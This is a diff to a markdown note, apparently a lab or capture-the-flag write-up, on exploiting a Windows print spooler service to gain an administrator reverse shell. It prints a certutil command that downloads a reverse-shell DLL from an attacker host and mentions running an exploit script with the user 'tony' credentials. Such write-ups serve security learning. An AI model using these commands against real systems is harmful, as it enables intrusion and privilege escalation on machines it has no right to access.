@@ -8,4 +8,7 @@ If spooler service is running with RPC port 135, SMB on port 445 with signing di
 ### First we will upload reverse shell DLL to victim machine
 First we will upload reverse shell DLL to victim machine using command `certutil -urlcache -split -f "http://10.10.14.98:8000/rs.dll" dn.dll`.
 ![[Pasted image 20211007190628.png]]
-## Running python script 
+## Running exploit python script providing path of DLL and 'tony' username and password to get reverse shell as administrator
+Running exploit python script providing path of DLL and 'tony' username and password to get reverse shell as administrator.
+![[Pasted image 20211007191515.png]]
+
